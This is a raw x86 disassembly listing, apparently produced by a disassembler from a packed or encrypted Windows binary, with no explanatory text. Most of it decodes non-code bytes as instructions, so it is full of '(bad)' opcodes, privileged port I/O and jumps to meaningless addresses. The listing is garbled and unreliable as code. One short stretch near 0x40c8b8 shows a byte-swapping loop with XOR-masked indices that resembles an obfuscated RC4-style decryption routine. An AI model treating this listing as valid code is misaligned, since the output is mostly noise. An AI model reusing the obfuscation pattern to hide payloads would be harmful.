  40c20b:	std    
  40c20c:	pop    edx
  40c20d:	jmp    0x40c252
  40c20f:	dec    eax
  40c210:	fild   DWORD PTR [edx+0x16]
  40c213:	imul   edi,esp,0x4def053d
  40c219:	ds dec ecx
  40c21b:	leave  
  40c21c:	mov    DWORD PTR [ebx-0x27b4a2ce],edi
  40c222:	and    BYTE PTR [esi+0x4b],dh
  40c225:	mov    DWORD PTR [edx],ebp
  40c227:	xor    ebp,DWORD PTR [ebp-0x8]
  40c22a:	push   ebx
  40c22b:	aaa    
  40c22c:	mov    eax,ds:0x82768ab1
  40c231:	into   
  40c232:	jae    0x40c29b
  40c234:	jno    0x40c1cb
  40c236:	(bad)  
  40c237:	cmp    eax,0xd9a8cc3
  40c23c:	bound  eax,QWORD PTR [eax-0x75]
  40c23f:	mov    eax,0x6f1de10
  40c244:	inc    edx
  40c245:	and    DWORD PTR [esi],edx
  40c247:	lea    ebp,[ebp-0x52]
  40c24a:	push   esi
  40c24b:	or     eax,0x6aff74d1
  40c250:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c251:	pop    eax
  40c252:	mov    ds,eax
  40c254:	icebp  
  40c255:	les    edi,FWORD PTR [esi-0x6e]
  40c258:	mov    ebp,0x67aeba70
  40c25d:	scas   eax,DWORD PTR es:[edi]
  40c25e:	sub    DWORD PTR [ecx],esp
  40c260:	pop    ds
  40c261:	inc    DWORD PTR [esi+eiz*1]
  40c264:	jnp    0x40c23f
  40c266:	and    ecx,DWORD PTR [ecx+0x69]
  40c269:	dec    esi
  40c26a:	retf   
  40c26b:	pop    ds
  40c26c:	ficomp DWORD PTR [ecx+0x3b4094e3]
  40c272:	pop    es
  40c273:	in     eax,dx
  40c274:	push   ebx
  40c275:	(bad)  
  40c277:	dec    edi
  40c278:	xchg   edx,eax
  40c279:	dec    edi
  40c27a:	jne    0x40c268
  40c27c:	and    esi,esi
  40c27e:	int    0xb
  40c280:	sbb    eax,esp
  40c282:	sbb    eax,0x9cb1e831
  40c287:	into   
  40c288:	mov    esp,0xdc84a132
  40c28d:	xchg   ecx,eax
  40c28e:	pop    ecx
  40c28f:	je     0x40c2f8
  40c291:	pop    eax
  40c292:	daa    
  40c293:	dec    esi
  40c294:	adc    BYTE PTR [eax+0x635dca54],ch
  40c29a:	fcom   QWORD PTR [ecx]
  40c29c:	les    eax,FWORD PTR [ebx]
  40c29e:	push   esp
  40c29f:	fisttp QWORD PTR [edx-0x7d]
  40c2a2:	mov    ch,0xa8
  40c2a4:	push   ebp
  40c2a5:	push   0xffffffe4
  40c2a7:	add    ch,cl
  40c2a9:	mov    bh,0x40
  40c2ab:	adc    eax,0x98776710
  40c2b0:	push   edx
  40c2b1:	jmp    0x15ea:0x48fe7521
  40c2b8:	mov    eax,0xec2a5a91
  40c2bd:	test   BYTE PTR [edx+0x6982caf2],0x27
  40c2c4:	inc    esi
  40c2c5:	mov    BYTE PTR [edi+edi*8],ch
  40c2c8:	out    dx,eax
  40c2c9:	mov    WORD PTR [eax],ss
  40c2cb:	fs push cs
  40c2cd:	dec    ebp
  40c2ce:	sar    DWORD PTR [esi-0x2361c7f1],1
  40c2d4:	xchg   DWORD PTR [edi],edx
  40c2d6:	mov    ds:0xabcae9a3,eax
  40c2db:	mov    edx,db7
  40c2de:	ror    BYTE PTR [esp+eiz*4],cl
  40c2e1:	and    eax,0x4d201b7
  40c2e6:	dec    ecx
  40c2e7:	cs or  al,0x66
  40c2ea:	lods   al,BYTE PTR ds:[esi]
  40c2eb:	mov    ebp,0x143dc0f5
  40c2f0:	mov    ds:0xd4898710,eax
  40c2f5:	mov    bl,0x29
  40c2f7:	jae    0x40c2b6
  40c2f9:	idiv   DWORD PTR [ebx]
  40c2fb:	ja     0x40c2ba
  40c2fd:	mov    dh,0x7a
  40c2ff:	(bad)  
  40c300:	and    eax,0x8b63f504
  40c305:	pop    ss
  40c306:	xchg   edx,eax
  40c307:	sub    edx,DWORD PTR [ecx]
  40c309:	cmp    al,BYTE PTR [ebx+edx*2]
  40c30c:	push   ebx
  40c30d:	jo     0x40c2d9
  40c30f:	lds    ebx,FWORD PTR [eax-0x76d8889e]
  40c315:	sbb    ecx,DWORD PTR [edx+0x65]
  40c318:	mov    esp,0x243e8209
  40c31d:	mov    dh,0x47
  40c31f:	mov    ds:0xd99cbcf8,eax
  40c324:	jnp    0x40c34b
  40c326:	mov    edi,gs
  40c328:	push   eax
  40c329:	cmp    bl,bh
  40c32b:	push   ds
  40c32c:	xchg   DWORD PTR [edi+0x38850361],esp
  40c332:	adc    eax,0x8a5ae3d8
  40c337:	mov    esp,0x6fe3df95
  40c33c:	bnd jmp 0x40c369
  40c33f:	mov    ds:0xc2072c82,eax
  40c344:	stos   DWORD PTR es:[edi],eax
  40c345:	in     al,dx
  40c346:	push   ebp
  40c347:	das    
  40c348:	pop    ecx
  40c349:	test   DWORD PTR [eax+0x43],eax
  40c34c:	cmp    bh,BYTE PTR [edx-0x20]
  40c34f:	pop    edx
  40c350:	call   0x10faec03
  40c355:	push   ds
  40c356:	xor    eax,0x891d4dcc
  40c35b:	mov    eax,ds:0xea9c03a3
  40c360:	and    ebp,DWORD PTR [edi-0x20]
  40c363:	sbb    edi,edx
  40c365:	mov    cl,0x69
  40c367:	sbb    esp,DWORD PTR ds:0xe3f3e2d4
  40c36d:	int    0x8d
  40c36f:	and    DWORD PTR [ecx-0x7f0fb261],ebp
  40c375:	xor    DWORD PTR ds:[ebx+0x1d00cce0],ebx
  40c37c:	mov    ch,0x48
  40c37e:	gs lock mov dh,0x22
  40c382:	jg     0x40c34a
  40c384:	mov    edi,0xa2889e2e
  40c389:	add    bh,BYTE PTR [edx+0x8]
  40c38c:	and    al,0x81
  40c38e:	fdiv   DWORD PTR [ebp+ecx*4-0xd]
  40c392:	cmp    dl,bl
  40c394:	mov    ebp,DWORD PTR [ebp-0x7d]
  40c397:	sub    al,0xba
  40c399:	iret   
  40c39a:	jne    0x40c34b
  40c39c:	adc    eax,0xf87faa39
  40c3a1:	xchg   esi,eax
  40c3a2:	frstor [ecx]
  40c3a4:	repnz test al,0x6f
  40c3a7:	(bad)  
  40c3a8:	fld    DWORD PTR [edx-0x56]
  40c3ab:	les    ecx,FWORD PTR [esi+0x53c2da74]
  40c3b1:	call   0xd111:0x93c35a2
  40c3b8:	jg     0x40c42d
  40c3ba:	cmp    edx,DWORD PTR [eax]
  40c3bc:	mov    cl,0xc8
  40c3be:	enter  0x3f4,0x26
  40c3c2:	lods   eax,DWORD PTR ds:[esi]
  40c3c3:	mov    cl,0x96
  40c3c5:	pop    es
  40c3c6:	mov    edi,0x3e9692ef
  40c3cb:	into   
  40c3cc:	scas   eax,DWORD PTR es:[edi]
  40c3cd:	push   esp
  40c3ce:	xchg   edx,eax
  40c3cf:	rcr    DWORD PTR ss:[ecx-0x2490fabe],cl
  40c3d6:	fst    QWORD PTR [ebp+0x8]
  40c3d9:	mov    BYTE PTR [edi+ebp*8],dh
  40c3dc:	and    ebp,DWORD PTR [ecx]
  40c3de:	adc    ecx,ebx
  40c3e0:	lahf   
  40c3e1:	lock push esi
  40c3e3:	mov    ecx,ebx
  40c3e5:	pop    eax
  40c3e6:	scas   eax,DWORD PTR es:[edi]
  40c3e7:	mov    edx,DWORD PTR [edx+0x70]
  40c3ea:	jno    0x40c411
  40c3ec:	pop    edx
  40c3ed:	mov    DWORD PTR [edx*8+0xd9a16aa],edi
  40c3f4:	imul   ecx,ecx,0x204b3091
  40c3fa:	adc    BYTE PTR [edi+0x62],0x46
  40c3fe:	sub    eax,DWORD PTR [edx-0x3a08f7e8]
  40c404:	int    0x7d
  40c406:	jno    0x40c3b3
  40c408:	aas    
  40c409:	add    BYTE PTR [ecx+0x4390de88],dl
  40c40f:	cmp    al,ch
  40c411:	gs cmp esi,ebp
  40c414:	jns    0x40c3c3
  40c416:	in     eax,0x9f
  40c418:	inc    ebx
  40c419:	sti    
  40c41a:	jge    0x40c3e4
  40c41c:	sub    eax,0x579b8f86
  40c421:	xchg   ecx,eax
  40c422:	popf   
  40c423:	pop    eax
  40c424:	imul   edi,ebp,0x11
  40c427:	jg     0x40c47d
  40c429:	fnstcw WORD PTR [edi]
  40c42b:	aam    0x63
  40c42d:	(bad)  
  40c42f:	popf   
  40c430:	adc    al,0x28
  40c432:	fimul  WORD PTR ds:0x8f005ba3
  40c438:	xlat   BYTE PTR fs:[ebx]
  40c43a:	pop    ebp
  40c43b:	out    0xf2,eax
  40c43d:	mul    BYTE PTR [esi-0x3b]
  40c440:	fsubr  QWORD PTR [ebp+eiz*1-0x2199345]
  40c447:	call   0x5ba0d8dd
  40c44c:	repz inc esi
  40c44e:	hlt    
  40c44f:	(bad)  
  40c450:	imul   edx,DWORD PTR [esi-0x10837d09],0xd0986cfd
  40c45a:	jo     0x40c4c5
  40c45c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c45d:	dec    esi
  40c45e:	sub    ah,ah
  40c460:	sar    DWORD PTR [edi+edx*2],0x18
  40c464:	mov    ds:0x42a45f45,al
  40c469:	mov    ch,0xf9
  40c46b:	add    DWORD PTR [eax-0x7960e58],esi
  40c471:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c472:	xchg   DWORD PTR [eax-0x3dec640a],ebx
  40c478:	rcr    BYTE PTR [esi-0x50],cl
  40c47b:	repz inc edi
  40c47d:	jp     0x40c43e
  40c47f:	mov    esi,0x3308fa32
  40c484:	jge    0x40c4e1
  40c486:	ret    
  40c487:	and    eax,0x786fa882
  40c48c:	and    bh,BYTE PTR [esp+ebx*8]
  40c48f:	outs   dx,DWORD PTR ds:[esi]
  40c490:	retf   
  40c491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c492:	ins    BYTE PTR es:[edi],dx
  40c493:	mov    ?,WORD PTR [esi+0x2f]
  40c496:	mov    BYTE PTR [edx-0x13],cl
  40c499:	aas    
  40c49a:	lahf   
  40c49b:	fld    TBYTE PTR [ecx-0x7c54bf9a]
  40c4a1:	xor    bh,ch
  40c4a3:	mov    dl,0xc
  40c4a5:	mov    dh,0xc0
  40c4a7:	xor    ch,bl
  40c4a9:	jg     0x40c442
  40c4ab:	mov    BYTE PTR [edi+0x39f5197],ch
  40c4b1:	call   0x12b9:0x84cb59da
  40c4b8:	fwait
  40c4b9:	hlt    
  40c4ba:	cwde   
  40c4bb:	bound  esi,QWORD PTR [ebx+0xb301d92]
  40c4c1:	aam    0x1a
  40c4c3:	stos   DWORD PTR es:[edi],eax
  40c4c4:	inc    ecx
  40c4c5:	out    0xda,al
  40c4c7:	ins    DWORD PTR es:[edi],dx
  40c4c8:	jle    0x40c479
  40c4ca:	inc    eax
  40c4cb:	leave  
  40c4cc:	rol    dh,1
  40c4ce:	push   edx
  40c4cf:	add    ah,dh
  40c4d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4d2:	jns    0x40c499
  40c4d4:	aaa    
  40c4d5:	stos   BYTE PTR es:[edi],al
  40c4d6:	xchg   ebx,ecx
  40c4d8:	dec    esp
  40c4d9:	sbb    eax,ebx
  40c4db:	jle    0x40c491
  40c4dd:	rcr    BYTE PTR [edx],cl
  40c4df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4e0:	push   ds
  40c4e1:	and    ebp,ebx
  40c4e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4e4:	jl     0x40c478
  40c4e6:	test   eax,0xf1641115
  40c4eb:	xor    ch,BYTE PTR [eax+edi*1]
  40c4ee:	test   al,0xe9
  40c4f0:	sbb    BYTE PTR [edx-0x2da02ba8],bh
  40c4f6:	xor    DWORD PTR [edx-0x24d9fbc8],eax
  40c4fc:	in     eax,0x85
  40c4fe:	out    dx,ax
  40c500:	adc    edx,DWORD PTR [ebx+edi*2-0x56]
  40c504:	lds    edx,FWORD PTR [eax+0x2c]
  40c507:	ret    
  40c508:	mov    ds:0xbe9c0fe6,al
  40c50d:	mov    cl,0x4f
  40c50f:	push   ecx
  40c510:	not    DWORD PTR [ebx-0x33a8f6d5]
  40c516:	test   eax,0x217b1e9c
  40c51b:	xor    dh,dl
  40c51d:	pop    esp
  40c51e:	inc    ebx
  40c51f:	fcmovnbe st,st(7)
  40c521:	xchg   edx,eax
  40c522:	and    ebp,DWORD PTR [ecx]
  40c524:	loop   0x40c504
  40c526:	inc    esi
  40c527:	xchg   edi,eax
  40c528:	sub    eax,0x3726985d
  40c52d:	jmp    0x288b8f70
  40c532:	jnp    0x40c5ad
  40c534:	les    edi,FWORD PTR [eax]
  40c536:	test   edx,ebx
  40c538:	loopne 0x40c587
  40c53a:	loope  0x40c52b
  40c53c:	inc    edx
  40c53d:	sub    eax,0x8b4154fc
  40c542:	push   ebp
  40c543:	call   0x5544957b
  40c548:	in     al,dx
  40c549:	mov    edi,DWORD PTR [ebp-0x1c]
  40c54c:	jmp    0x40c8bf
  40c551:	push   esp
  40c552:	pushf  
  40c553:	scas   al,BYTE PTR es:[edi]
  40c554:	stos   DWORD PTR es:[edi],eax
  40c555:	jbe    0x40c50c
  40c557:	pop    ebp
  40c558:	arpl   WORD PTR ds:0x2669733d,si
  40c55e:	out    dx,eax
  40c55f:	xor    BYTE PTR [edi],al
  40c561:	xchg   edi,eax
  40c562:	xchg   ebp,eax
  40c563:	jl     0x40c5e1
  40c565:	retf   0x7c79
  40c568:	jl     0x40c5ae
  40c56a:	std    
  40c56b:	cmp    DWORD PTR [ecx+esi*8+0x1da5a13e],esi
  40c572:	fwait
  40c573:	xchg   edi,eax
  40c574:	clc    
  40c575:	pop    edi
  40c576:	jp     0x40c557
  40c578:	aas    
  40c579:	push   es
  40c57a:	inc    esp
  40c57b:	cld    
  40c57c:	jge    0x40c4ff
  40c57e:	out    0x54,eax
  40c580:	jle    0x40c51b
  40c582:	in     al,dx
  40c583:	fwait
  40c584:	into   
  40c585:	(bad)  
  40c586:	in     al,dx
  40c587:	push   esp
  40c588:	(bad)  
  40c58a:	push   0x407e2d27
  40c58f:	xchg   ecx,eax
  40c590:	outs   dx,DWORD PTR ds:[esi]
  40c591:	cmp    dh,BYTE PTR ds:0x1d8cf9ca
  40c597:	jge    0x40c5e0
  40c599:	test   BYTE PTR [esi],ah
  40c59b:	aas    
  40c59c:	add    ch,BYTE PTR [edi+0x28ff5f2c]
  40c5a2:	int3   
  40c5a3:	xchg   DWORD PTR [ebx+0x7d],ecx
  40c5a6:	popa   
  40c5a7:	iret   
  40c5a8:	cdq    
  40c5a9:	lahf   
  40c5aa:	push   edi
  40c5ab:	jmp    0x40c604
  40c5ad:	dec    DWORD PTR [edi+0x6cb1c51c]
  40c5b3:	ja     0x40c5b9
  40c5b5:	jecxz  0x40c5ee
  40c5b7:	loope  0x40c615
  40c5b9:	fist   DWORD PTR [esi]
  40c5bb:	jg     0x40c62a
  40c5bd:	sub    dh,BYTE PTR [ebp+eax*2-0x65]
  40c5c1:	(bad)  
  40c5c2:	mov    ch,0x21
  40c5c4:	ss xchg esi,eax
  40c5c6:	(bad)  
  40c5c7:	sbb    eax,0xcbd0b87c
  40c5cc:	fisttp QWORD PTR ds:0x7a5f8c5c
  40c5d2:	jno    0x40c5db
  40c5d4:	(bad)  
  40c5d5:	nop
  40c5d6:	mov    eax,0x6cd7b0ca
  40c5db:	rcr    BYTE PTR [ebp+0x6c],1
  40c5de:	sub    BYTE PTR [edx-0x3233d61c],bl
  40c5e4:	test   al,0x58
  40c5e6:	sbb    al,0x5d
  40c5e8:	adc    ch,BYTE PTR [ebp-0x46192bf0]
  40c5ee:	fstp   DWORD PTR [ecx+0x2e574a00]
  40c5f4:	jl     0x40c5e9
  40c5f6:	pop    es
  40c5f7:	std    
  40c5f8:	push   ebx
  40c5f9:	cmp    DWORD PTR [eax+edx*8+0x9f95ed3],ebp
  40c600:	inc    edi
  40c601:	mov    dl,0xe5
  40c603:	gs mov ecx,0x349a4865
  40c609:	pop    ecx
  40c60a:	dec    ebx
  40c60b:	mov    al,0x72
  40c60d:	sbb    dh,0x11
  40c610:	pop    ecx
  40c611:	bound  ecx,QWORD PTR [eax-0x45d3e948]
  40c617:	fdivp  st(3),st
  40c619:	es dec edi
  40c61b:	jmp    0x40c683
  40c61d:	lods   al,BYTE PTR ds:[esi]
  40c61e:	das    
  40c61f:	pushf  
  40c620:	ficom  DWORD PTR [edx+0x42]
  40c623:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c624:	pop    ebx
  40c625:	aaa    
  40c626:	lock jmp 0xc3c8339e
  40c62c:	call   0x8e88:0x8ffa5763
  40c633:	jmp    0x11b4e408
  40c638:	jl     0x40c650
  40c63a:	test   al,0xb4
  40c63c:	cmp    edx,edi
  40c63e:	bound  esi,QWORD PTR [edi-0x5a]
  40c641:	sub    eax,0x28830dcb
  40c646:	(bad)  
  40c648:	lods   al,BYTE PTR ds:[esi]
  40c649:	and    al,0x91
  40c64b:	pop    es
  40c64c:	ins    BYTE PTR es:[edi],dx
  40c64d:	xor    al,0xc8
  40c64f:	or     eax,0x50b3bb74
  40c654:	div    DWORD PTR [edi+0x680abfca]
  40c65a:	cmp    ebx,esp
  40c65c:	jo     0x40c689
  40c65e:	mov    ebp,0xaf85181f
  40c663:	and    edi,DWORD PTR [ebx+0x4f1f86e3]
  40c669:	js     0x40c5f4
  40c66b:	adc    edx,DWORD PTR [esi]
  40c66d:	sahf   
  40c66e:	inc    eax
  40c66f:	xchg   DWORD PTR [ebp-0x63729224],esp
  40c675:	cmp    BYTE PTR [eax],dl
  40c677:	or     al,0xb2
  40c679:	push   ecx
  40c67a:	addr16 test cl,0x9a
  40c67e:	fwait
  40c67f:	lahf   
  40c680:	xchg   BYTE PTR [esi],al
  40c682:	mov    bh,0x2e
  40c684:	adc    BYTE PTR [ebx+0xacf9505],dl
  40c68a:	cmp    bl,BYTE PTR [ebp+0x1]
  40c68d:	dec    edx
  40c68e:	add    eax,0xd22fe262
  40c693:	xlat   BYTE PTR ds:[ebx]
  40c694:	xchg   BYTE PTR [edx],al
  40c696:	jmp    0x8219d1cd
  40c69b:	pop    ss
  40c69c:	or     DWORD PTR [eax],ebp
  40c69e:	and    edi,DWORD PTR gs:[ecx+0x7133adc9]
  40c6a5:	pop    ebx
  40c6a6:	mov    eax,ds:0x7cd616d8
  40c6ab:	add    BYTE PTR [edi],al
  40c6ad:	sbb    ch,BYTE PTR [ebx]
  40c6af:	jle    0x40c70a
  40c6b1:	leave  
  40c6b2:	addr16 pop ecx
  40c6b4:	mov    DWORD PTR [ebp*1-0x5fdb241f],ebx
  40c6bb:	jmp    0x6295:0x9fefde5c
  40c6c2:	adc    bl,cl
  40c6c4:	das    
  40c6c5:	into   
  40c6c6:	xor    DWORD PTR [eax+0x45fd13b5],esi
  40c6cc:	jmp    0x40c6f8
  40c6ce:	sbb    cl,BYTE PTR [ebx+esi*2+0x31973655]
  40c6d5:	xchg   edi,eax
  40c6d6:	dec    edi
  40c6d7:	push   esp
  40c6d8:	push   0xffffffd7
  40c6da:	pop    ss
  40c6db:	(bad)  
  40c6dc:	out    dx,eax
  40c6dd:	ret    0xd5ea
  40c6e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6e1:	push   eax
  40c6e2:	jnp    0x40c729
  40c6e4:	lods   eax,DWORD PTR ds:[esi]
  40c6e5:	iret   
  40c6e6:	jecxz  0x40c715
  40c6e8:	aaa    
  40c6e9:	daa    
  40c6ea:	addr16 jp 0x40c6e9
  40c6ed:	xchg   esi,eax
  40c6ee:	lea    esi,[esi]
  40c6f0:	in     al,0x2d
  40c6f2:	adc    bh,BYTE PTR [ecx]
  40c6f4:	stos   BYTE PTR es:[edi],al
  40c6f5:	arpl   WORD PTR [eax-0x35f2153b],bx
  40c6fb:	clc    
  40c6fc:	pop    edi
  40c6fd:	out    0x25,al
  40c6ff:	jp     0x40c6c6
  40c701:	(bad)  
  40c702:	iret   
  40c703:	dec    ebx
  40c704:	int    0xd6
  40c706:	adc    al,0x3f
  40c708:	jnp    0x40c74c
  40c70a:	pop    esp
  40c70b:	aaa    
  40c70c:	xor    eax,0xcf2ea1ca
  40c711:	dec    esi
  40c712:	cs call 0xf82ae2b
  40c718:	in     al,0x8b
  40c71a:	repz ret 
  40c71c:	sub    eax,0x9feba556
  40c721:	stos   BYTE PTR es:[edi],al
  40c722:	inc    edi
  40c723:	out    dx,eax
  40c724:	popf   
  40c725:	jne    0x40c6f7
  40c727:	mov    ds:0xc86b9147,eax
  40c72c:	push   ss
  40c72d:	lea    eax,[ecx+0x72d253d7]
  40c733:	cmp    esp,ecx
  40c735:	xchg   DWORD PTR [esi],ebx
  40c737:	jle    0x40c718
  40c739:	and    DWORD PTR [esi],0xd46d9ef7
  40c73f:	jo     0x40c76a
  40c741:	xchg   esi,eax
  40c742:	ss into 
  40c744:	jno    0x40c6d2
  40c746:	lods   al,BYTE PTR ds:[esi]
  40c747:	cmp    al,0x2
  40c749:	jmp    0x40c7bd
  40c74b:	and    eax,DWORD PTR [ebx]
  40c74d:	inc    eax
  40c74e:	sbb    ah,BYTE PTR [esi]
  40c750:	push   edi
  40c751:	and    ecx,DWORD PTR [edi]
  40c753:	shl    BYTE PTR [edx],1
  40c755:	mov    ebx,0x62ba0249
  40c75a:	cmp    cl,BYTE PTR [ebx-0x600f7ae2]
  40c760:	lahf   
  40c761:	inc    ebp
  40c762:	xchg   edi,eax
  40c763:	jle    0x40c74b
  40c765:	es loope 0x40c7d7
  40c768:	or     eax,0xd4b85e24
  40c76d:	out    dx,eax
  40c76e:	mov    al,0xb0
  40c770:	dec    ebp
  40c771:	icebp  
  40c772:	add    BYTE PTR [edi+0xff7cfa1],ch
  40c778:	jmp    0x1e2d0f78
  40c77d:	shr    edx,cl
  40c77f:	inc    ebp
  40c780:	aaa    
  40c781:	push   0xffffffc3
  40c783:	(bad)  
  40c784:	xchg   esi,eax
  40c785:	test   eax,0x4f861c5b
  40c78a:	mov    bh,0x6
  40c78c:	ja     0x40c789
  40c78e:	stos   DWORD PTR es:[edi],eax
  40c78f:	out    0xf,al
  40c791:	test   BYTE PTR [edi+0x6896d4d4],al
  40c797:	dec    esp
  40c798:	inc    edi
  40c799:	adc    eax,0x4d0dfcaa
  40c79e:	mov    esi,0x5fbc2c8d
  40c7a3:	inc    edx
  40c7a4:	call   0xbb26:0x7193f491
  40c7ab:	popa   
  40c7ac:	fidiv  DWORD PTR [ecx]
  40c7ae:	add    BYTE PTR fs:[edi-0x85c1e7f],bh
  40c7b5:	adc    eax,0xac0b3f49
  40c7ba:	xchg   edx,eax
  40c7bb:	sti    
  40c7bc:	add    al,0x46
  40c7be:	les    esp,FWORD PTR [edi-0x44]
  40c7c1:	fisttp WORD PTR [ebx-0x1c03f7ad]
  40c7c7:	adc    DWORD PTR [edx+0x7f075043],ecx
  40c7cd:	mov    dh,BYTE PTR [edi+0x53e38e04]
  40c7d3:	or     BYTE PTR ds:0x8b258a4b,bh
  40c7d9:	mov    cl,0xa
  40c7db:	cdq    
  40c7dc:	pop    ss
  40c7dd:	enter  0x3f8b,0x30
  40c7e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7e2:	jb     0x40c84d
  40c7e4:	hlt    
  40c7e5:	aas    
  40c7e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7e7:	test   DWORD PTR [ebx+ecx*8-0x66cd7e63],0x85341e55
  40c7f2:	or     DWORD PTR [ecx+0x37b4a9b9],ecx
  40c7f8:	mov    edi,ebp
  40c7fa:	outs   dx,BYTE PTR ds:[esi]
  40c7fb:	inc    edx
  40c7fc:	pop    ss
  40c7fd:	sbb    ah,BYTE PTR [ebx+0x35]
  40c800:	mov    eax,0x956cfc95
  40c805:	sbb    ebp,esi
  40c807:	xchg   ecx,eax
  40c808:	(bad)  
  40c809:	je     0x40c873
  40c80b:	push   0xffffffe5
  40c80d:	sahf   
  40c80e:	mov    edi,DWORD PTR [ebx]
  40c810:	in     eax,0xee
  40c812:	sar    BYTE PTR [eax],0xc0
  40c815:	stc    
  40c816:	xor    bl,ah
  40c818:	dec    BYTE PTR [ebp+0x1847bf89]
  40c81e:	sub    DWORD PTR [ebx+0x5f46df92],ebx
  40c824:	jns    0x40c806
  40c826:	mov    ds,WORD PTR [edi+0x60]
  40c829:	int3   
  40c82a:	loop   0x40c803
  40c82c:	push   esp
  40c82d:	inc    eax
  40c82e:	bound  edi,QWORD PTR [esi]
  40c830:	cmp    eax,0x73b9fc2e
  40c835:	fldenv [eax+0x6d6061af]
  40c83b:	clc    
  40c83c:	repz pop esp
  40c83e:	mov    bh,0x41
  40c840:	push   ecx
  40c841:	mov    eax,0x41069e0c
  40c846:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c847:	xchg   ecx,eax
  40c848:	and    DWORD PTR [ecx-0x4b5ff55b],ebx
  40c84e:	push   eax
  40c84f:	inc    ecx
  40c850:	stos   DWORD PTR es:[edi],eax
  40c851:	xchg   ebx,eax
  40c852:	mov    dh,0x1b
  40c854:	sbb    DWORD PTR [ecx+0x4],0xffffff8c
  40c858:	xor    BYTE PTR [ebx],0x5f
  40c85b:	adc    eax,0x75edfa1a
  40c860:	rcr    BYTE PTR [ecx+edx*2-0x2],cl
  40c864:	popf   
  40c865:	popf   
  40c866:	stos   DWORD PTR es:[edi],eax
  40c867:	inc    ebp
  40c868:	inc    esi
  40c869:	sbb    al,0xec
  40c86b:	adc    DWORD PTR [ecx-0x11e274fc],0x61
  40c872:	ss call 0xebe9:0x4c3b2416
  40c87a:	inc    ecx
  40c87b:	add    eax,0x22d3c539
  40c880:	test   eax,0xa36b5a62
  40c885:	add    al,ch
  40c887:	jb     0x40c89b
  40c889:	xor    DWORD PTR [eax+ebx*1+0x6a],edx
  40c88d:	ret    0x2b35
  40c890:	popf   
  40c891:	js     0x40c861
  40c893:	loopne 0x40c8db
  40c895:	imul   edi,DWORD PTR [ebp-0x3f3aa993],0x24a46974
  40c89f:	sar    DWORD PTR [edx-0x33],0xdf
  40c8a3:	sub    eax,DWORD PTR ds:0x1dd1e0cc
  40c8a9:	jnp    0x40c8f9
  40c8ab:	int3   
  40c8ac:	test   DWORD PTR [esi],0xf3c0ed8
  40c8b2:	jo     0x40c8b6
  40c8b4:	add    al,0x18
  40c8b6:	cmp    al,0xd0
  40c8b8:	mov    DWORD PTR [ecx+0x55],0xbba06a40
  40c8bf:	mov    dl,BYTE PTR [edx+edi*1+0x32729a]
  40c8c6:	mov    BYTE PTR [ebp+0xf],dl
  40c8c9:	mov    edx,DWORD PTR [ebp-0xc]
  40c8cc:	xor    edx,eax
  40c8ce:	add    edx,DWORD PTR [ebp-0x14]
  40c8d1:	mov    edi,DWORD PTR [ebp-0x1c]
  40c8d4:	mov    dl,BYTE PTR [edx+edi*1+0x32729a]
  40c8db:	mov    BYTE PTR [ebp+0xb],dl
  40c8de:	mov    dl,BYTE PTR [ebp+0xf]
  40c8e1:	mov    edi,DWORD PTR [ebp-0xc]
  40c8e4:	xor    edi,eax
  40c8e6:	add    edi,DWORD PTR [ebp-0x14]
  40c8e9:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8ec:	mov    BYTE PTR [edi+ebx*1+0x32729a],dl
  40c8f3:	mov    dl,BYTE PTR [ebp+0xb]
  40c8f6:	mov    edi,DWORD PTR [ebp-0x18]
  40c8f9:	xor    edi,eax
  40c8fb:	add    edi,DWORD PTR [ebp-0x14]
  40c8fe:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c901:	mov    BYTE PTR [edi+ebx*1+0x32729a],dl
  40c908:	mov    edx,DWORD PTR [ebp-0x44]
  40c90b:	mov    edi,DWORD PTR [ebp-0xc]
  40c90e:	xor    edx,eax
  40c910:	xor    edi,eax
  40c912:	jmp    0x40cc85
  40c917:	dec    si
  40c919:	(bad)  
  40c91a:	mov    dh,0xf7
  40c91c:	mov    cl,0x71
  40c91e:	dec    esi
  40c91f:	imul   esp,DWORD PTR [eax+0x63],0xffffff8e
  40c923:	mov    ebx,0x6d7ec2ff
  40c928:	xchg   esi,eax
  40c929:	jl     0x40c9a7
  40c92b:	retf   0x7c79
  40c92e:	jl     0x40c8e7
  40c930:	xor    al,0xad
  40c932:	sub    DWORD PTR [edi-0x1f],0x5a6306ca
  40c939:	pop    ebp
  40c93a:	call   0xce10d213
  40c93f:	xor    al,dh
  40c941:	and    al,0xba
  40c943:	scas   al,BYTE PTR es:[edi]
  40c944:	or     DWORD PTR [edx+0x1e],esp
  40c947:	ficom  WORD PTR [edx+0x7b8c509d]
  40c94d:	loope  0x40c9c2
  40c94f:	xchg   ebx,eax
  40c950:	in     eax,dx
  40c951:	pop    ebp
  40c952:	je     0x40c8f1
  40c954:	in     eax,0xdf
  40c956:	inc    esp
  40c957:	dec    esp
  40c958:	mov    BYTE PTR [ebp+0x3fcf1c0a],cl
  40c95e:	mov    BYTE PTR [esi],cl
  40c960:	xor    DWORD PTR [eax+eiz*2],ecx
  40c963:	dec    eax
  40c964:	mov    al,ds:0x4f38d2bb
  40c969:	jle    0x40c9c5
  40c96b:	push   cs
  40c96c:	ret    
  40c96d:	adc    edx,DWORD PTR [ebx]
  40c96f:	ret    0xaa5b
  40c972:	xchg   esi,eax
  40c973:	add    BYTE PTR [edx-0x65],bl
  40c976:	scas   eax,DWORD PTR es:[edi]
  40c977:	hlt    
  40c978:	xlat   BYTE PTR ds:[ebx]
  40c979:	sub    ecx,0x22
  40c97c:	sub    bl,BYTE PTR [ecx+0x2f]
  40c97f:	push   ebx
  40c980:	loope  0x40c906
  40c982:	jmp    0x244c:0x626b2cfb
  40c989:	ret    0xe2cc
